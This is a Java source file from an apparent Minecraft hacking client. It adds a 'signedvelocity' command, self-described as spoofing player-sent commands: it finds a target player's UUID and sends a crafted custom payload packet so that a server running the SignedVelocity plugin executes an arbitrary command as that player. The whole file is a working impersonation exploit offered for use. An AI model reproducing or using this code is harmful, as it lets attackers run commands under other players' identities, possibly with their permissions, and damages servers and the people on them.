package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.SignedVelocityPayloadPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class SignedVelocityCommand extends Command {
    public SignedVelocityCommand(MinecraftClient minecraftClient) {
        super("signedvelocity", "Spoofs player sent commands", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    Helper.printChatMessage("Incomplete command!");
                    return SINGLE_SUCCESS;
                })
                .then(argument("user", StringArgumentType.word())
                        .suggests((ctx, builder) -> {
                            String partialName;

                            try {
                                partialName = ctx.getArgument("user", String.class).toLowerCase();
                            } catch (IllegalArgumentException ignored) {
                                partialName = "";
                            }

                            if (partialName.isEmpty()) {
                                getMinecraftClient().getNetworkHandler().getPlayerList().forEach(playerListEntry -> builder.suggest(playerListEntry.getProfile().getName()));
                                return builder.buildFuture();
                            }

                            String finalPartialName = partialName;

                            getMinecraftClient().getNetworkHandler().getPlayerList().stream().map(PlayerListEntry::getProfile)
                                    .filter(player -> player.getName().toLowerCase().startsWith(finalPartialName.toLowerCase()))
                                    .forEach(profile -> builder.suggest(profile.getName()));

                            return builder.buildFuture();
                        })
                        .executes(context -> {
                            Helper.printChatMessage("Incomplete command!");
                            return SINGLE_SUCCESS;
                        })
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    String user = context.getArgument("user", String.class);
                                    for (PlayerListEntry p : getMinecraftClient().getNetworkHandler().getPlayerList())
                                        if (p.getProfile().getName().equalsIgnoreCase(user)) {
                                            Helper.sendPacket(new CustomPayloadC2SPacket(new SignedVelocityPayloadPacket(
                                                    p.getProfile().getId().toString(), context.getArgument("command", String.class)
                                            )));
                                            Helper.printChatMessage("Payload sent!");
                                            return SINGLE_SUCCESS;
                                        }

                                    Helper.printChatMessage("Player not found!");
                                    return SINGLE_SUCCESS;
                                })
                        )
                );
    }
}
